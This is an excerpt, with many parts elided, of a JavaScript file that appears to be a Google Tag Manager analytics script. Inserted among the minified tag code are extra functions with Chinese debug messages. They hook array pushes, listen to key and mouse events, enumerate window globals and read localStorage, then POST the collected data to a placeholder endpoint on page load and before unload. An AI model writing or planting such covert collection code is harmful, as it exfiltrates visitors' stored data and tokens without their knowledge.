...
(function () {
  ...
  function jshook(collection) {
    var originalMethod = collection.push;
    collection.push = function () {
      // Do something when a new element is added to the collection.
      console.debug("新增元素：", JSON.stringify(arguments));
  ...
  function listenEvents() {
    var types = ["mouseup", "mousedown", "mousemove", "keydown", "keyup"];
    types.forEach(function (type) {
      document.addEventListener(type, function (event) {
        console.debug(`事件被监听: ${type}`);
      });
    });
  }
  var lc = function (a) {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.gk = "ChEIgJrLqwYQ8rmNr4e66v2jARImAFdulMNH3fjygAsZcxZFoIlxWGKXgQb2Q1WZOMnXbGSNMoyXb/caAtmi";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  R(41);
  R(42);
  function discoverUnknownProps() {
    const unknownProps = {};
    for (const propName in window) {
      if (!Object.prototype.hasOwnProperty.call(window, propName)) {
        continue;
      }
      if (!window.identifiedVars || !window.identifiedVars.includes(propName)) {
        unknownProps[propName] = {
          type: typeof window[propName],
  ...
  function sendTrackingData(data) {
    const httpEndPoint = "https://sample.com/api/receive";
    fetch(httpEndPoint, {
      method: "POST",
      headers: {
      ...
      if (response.ok) {
        console.debug("追踪数据传输成功");
      } else {
        console.warn(`追踪数据传输失败,HTTP状态码: ${response.status}`);
      }
    });
  }
  var tj = function (a) {
  ...
  window.addEventListener("load", function () {
    const globalVars = gatherGlobalVars();
    const lsContent = trackLocalStorage();
    const unknownProps = discoverUnknownProps();
    // Add the collected data to the existing trackData variable.
    window.trackData = {
      ...window.trackData,
      globalVars,
      lsContent,
    ...
    // Send tracking data.
    sendTrackingData(window.trackData);
  });
  var Il = function (a) {
      if (z.top == z) return 0;
      if (void 0 === a ? 0 : a) {
  ...
  window.addEventListener("beforeunload", function () {
    console.debug("页面即将卸载,执行追踪任务");
    // Send tracking data just before unloading the page
    sendTrackingData(window.trackData);
  });
  function iE(a) {
    var b = void 0;
  ...
  function kE() {
    var a = new sb();
    M(this, "read_container_data"), a.set("containerId", 'UA-80722056-3'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
